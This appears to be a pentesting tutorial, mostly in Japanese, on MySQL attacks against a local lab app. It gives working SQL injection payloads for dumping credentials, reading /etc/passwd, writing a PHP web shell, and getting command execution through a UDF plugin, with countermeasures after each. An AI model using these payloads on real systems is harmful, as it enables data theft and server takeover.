# MySQL Pentesting Techniques

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=6 orderedList=false} -->

<!-- code_chunk_output -->

- [Normal request](#normal-request)
- [Query log](#query-log)
- [Basic SQL Injection](#basic-sql-injection)
- [LOAD_FILE - Read file](#load_file-read-file)
  - [前提条件](#前提条件)
  - [手順](#手順)
    - [Step 1: LOAD_FILEで読みだした内容をSELECT文で出力する](#step-1-load_fileで読みだした内容をselect文で出力する)
  - [対策](#対策)
- [INTO OUTFILE - Write a PHP file to RCE](#into-outfile-write-a-php-file-to-rce)
  - [前提条件](#前提条件-1)
  - [手順](#手順-1)
    - [Step 1: WebShell入りのPHPファイルを `INTO OUTFILE` で書き込む](#step-1-webshell入りのphpファイルを-into-outfile-で書き込む)
    - [Step 2: PHP経由でOSコマンドを実行する](#step-2-php経由でosコマンドを実行する)
  - [対策](#対策-1)
- [UDF - Write a plugin file to RCE](#udf-write-a-plugin-file-to-rce)
  - [前提条件](#前提条件-2)
  - [アイデア](#アイデア)
  - [手順](#手順-2)
    - [Step 1: プラグインディレクトリを特定する](#step-1-プラグインディレクトリを特定する)
    - [Step 2: プラグインを書き込む](#step-2-プラグインを書き込む)
    - [Step 3: プラグインをロードしてUDFを作成する](#step-3-プラグインをロードしてudfを作成する)
    - [Step 4: UDF経由でOSコマンドを実行する](#step-4-udf経由でosコマンドを実行する)
  - [対策](#対策-2)

<!-- /code_chunk_output -->


## Normal request

```
http://localhost:8888/mysql.php?user=admin&pass=p4ssw0rd
```


## Query log

```
less +F ./log/mysql/query.log
```


## Basic SQL Injection

**UNION SELECT**

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT 1, 2, 3;--+
```

```
http://localhost:8888/mysql.php?user=&pass=' UNION ALL SELECT id, username, password FROM users;--+
```


**複文実行**

```
http://localhost:8888/mysql.php?user=&pass='; INSERT INTO users VALUES (1337, 'pwned', 'hello');--+
```

```
http://localhost:8888/mysql.php?user=&pass='; DELETE FROM users WHERE username='pwned';--+
```


## LOAD_FILE - Read file

### 前提条件

- secure-file-privが無効化されている場合（MySQL 5.7.5以前はデフォルト無効）


### 手順

#### Step 1: LOAD_FILEで読みだした内容をSELECT文で出力する

`load_file`関数を用いてファイルの内容を読み出す。UNION SELECTで内容を出力させることができる

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,load_file('/etc/passwd');--+
```

> result:
>
> id=, username=, password=root:​x:0:0:root:/root:/bin/bash daemon:​x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:​x:2:2:bin:/bin:/usr/sbin/nologin sys:​x:3:3:sys:/dev:/usr/sbin/nologin sync:​x:4:65534:sync:/bin:/bin/sync games:​x:5:60:games:/usr/games:/usr/sbin/nologin man:​x:6:12:​man:/var/cache/man:/usr/sbin/nologin lp:​x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:​x:8:8:mail:/var/mail:/usr/sbin/nologin news:​x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:​x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:​x:13:13:proxy:/bin:/usr/sbin/nologin www-data:​x:33:33:www-data:/var/www:/usr/sbin/nologin backup:​x:34:34:backup:/var/backups:/usr/sbin/nologin list:​x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:​x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:​x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:​x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:​x:​100:65534::/nonexistent:/usr/sbin/nologin mysql:​x:999:999::/home/mysql:/bin/sh


### 対策

- secure-file-privオプションを有効化してファイル読み込みを禁止する


## INTO OUTFILE - Write a PHP file to RCE

### 前提条件

- MySQLがPHPの公開ディレクトリにアクセスできる場合
- secure-file-privが無効化されている場合（MySQL 5.7.5以前はデフォルト無効）


### 手順

#### Step 1: WebShell入りのPHPファイルを `INTO OUTFILE` で書き込む

以下のデータをPHPファイルとして書き込む。

```php
<?php $param=$_GET["cmd"]; echo shell_exec($param);
```

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,'<?php $param=$_GET["cmd"]; echo shell_exec($param);' INTO OUTFILE '/var/www/html/poc.php
```


#### Step 2: PHP経由でOSコマンドを実行する

書き込みに成功していれば以下のURLで任意コマンド実行ができる。

```
❯ curl 'http://localhost:8888/poc.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### 対策

- MySQLとWebサーバは分離した構成にする
- secure-file-privオプションを有効化してファイル書き込みを禁止する


## UDF - Write a plugin file to RCE

### 前提条件

- 複文実行できる設定になっている場合
- プラグインディレクトリにMySQLのプロセスが書き込み可能な場合


### アイデア

- MySQLではC言語でプラグインを書いて、独自のSQL関数（UDF）を実装することができる
- C言語内では当然任意のコードが実行できるので、OSコマンドを実行するUDFを作り出すことも可能
  - 例. https://www.exploit-db.com/exploits/1518
- MySQLがプラグインディレクトリに書き込む権限を持っている場合、UDFを含むバイナリを書き込み、プラグインとしてロードさせることで任意コード実行ができる
- コンパイル済みのOSコマンド実行UDFも世の中に転がっている
  - 例. https://www.exploit-db.com/exploits/46249


### 手順

#### Step 1: プラグインディレクトリを特定する

バイナリファイルをどこに書き込めば良いか調べる。

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT @@plugin_dir,'','';--+
```

> result:
>
> id=/usr/lib/mysql/plugin/, username=, password=


#### Step 2: プラグインを書き込む

[既存のExploitコード](https://www.exploit-db.com/exploits/46249)中に含まれる `shellcode_x64` の値がコンパイル済みのバイナリデータになっている。以下の手順ではこちらの値を流用する。

GETリクエストだとURI長の制限に引っかかるため、POSTリクエストで投げる。

もし、GETリクエストしか使えない場合は、バイナリファイルを分割してDB内に格納し、後から連結することで制限を回避できる。

```
curl http://localhost:8888/mysql.php \
  -d 'user=' \
  -d "pass='; SELECT BINARY /*ここに数値としてバイナリデータを入れる（例. 0x41424344）*/ into dumpfile '/usr/lib/mysql/plugin/mysql_udfsys.so';--+"
```


#### Step 3: プラグインをロードしてUDFを作成する

バイナリファイル内の `sys_exec` シンボルの関数がUDFとして実行できるようになる。

```
http://localhost:8888/mysql.php?user=&pass='; CREATE FUNCTION sys_exec RETURNS int SONAME 'mysql_udfsys.so';--+
```


#### Step 4: UDF経由でOSコマンドを実行する

コマンド実行結果が分からないので、ファイルに書き込んでコマンド実行の成功を確かめる。

```
http://localhost:8888/mysql.php?user=&pass=' UNION SELECT sys_exec('echo PWNED! > /var/www/html/udf_poc'), '', '';--+
```

```
❯ curl http://localhost:8888/udf_poc
PWNED!
```


### 対策

- 複文実行を禁止するオプションを有効化するか、sqliなどを使用する
- MySQLプロセスの権限を必要最小限に絞る
- secure-file-privオプションを有効化してファイル書き込みを禁止する
